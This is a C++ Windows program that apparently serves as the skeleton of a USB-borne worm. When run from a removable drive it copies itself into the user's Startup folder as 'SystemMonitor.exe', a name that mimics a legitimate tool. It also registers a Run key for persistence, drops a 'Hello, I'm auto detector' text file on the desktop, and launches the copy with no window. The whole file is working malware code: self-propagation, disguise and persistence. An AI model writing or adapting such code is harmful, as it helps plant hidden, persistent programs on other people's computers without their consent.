#include <windows.h>
#include <shlobj.h>
#include <tchar.h>
#include <stdio.h>
#include <string>
#include <fstream>
#include <winreg.h>

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")


bool IsRunningFromUSB() {
    TCHAR path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    
    TCHAR drive[4] = {path[0], path[1], path[2], '\0'};
    
    UINT type = GetDriveType(drive);
    return (type == DRIVE_REMOVABLE);
}

std::wstring GetStartupPath() {
    PWSTR startupPath = NULL;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &startupPath);
    
    std::wstring result(startupPath);
    CoTaskMemFree(startupPath);
    
    return result;
}

std::wstring CopyToHost() {
    TCHAR currentPath[MAX_PATH];
    GetModuleFileName(NULL, currentPath, MAX_PATH);
    
    std::wstring startupPath = GetStartupPath();
    std::wstring fileName = std::wstring(L"SystemMonitor.exe");
    std::wstring targetPath = startupPath + L"\\" + fileName;
    
    CopyFile(currentPath, targetPath.c_str(), FALSE);
    
    return targetPath;
}

bool AddPersistence(const std::wstring& executablePath) {
    HKEY hKey;
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey);
    
    if (result != ERROR_SUCCESS) {
        return false;
    }
    
    result = RegSetValueEx(
        hKey,
        L"SystemMonitor",
        0,
        REG_SZ,
        (const BYTE*)executablePath.c_str(),
        (executablePath.size() + 1) * sizeof(wchar_t));
    
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

void CreateMessageFile() {
    std::wstring desktopPath;
    PWSTR path = NULL;
    
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &path))) {
        desktopPath = path;
        CoTaskMemFree(path);
    } else {
        return;
    }
    
    std::wstring filePath = desktopPath + L"\\detection_message.txt";
    std::ofstream file(filePath);
    if (file.is_open()) {
        file << "Hello, I'm auto detector";
        file.close();
    }
}

void ExecuteOnHost(const std::wstring& path) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    CreateProcess(
        NULL,
        (LPWSTR)path.c_str(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW, 
        NULL,
        NULL,
        &si,
        &pi);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsRunningFromUSB()) {
        return 0;
    }
    std::wstring newPath = CopyToHost();
    if (newPath.empty()) {
        return 1;
    }
    
    AddPersistence(newPath);
    CreateMessageFile();
    ExecuteOnHost(newPath);
    
    return 0;
}
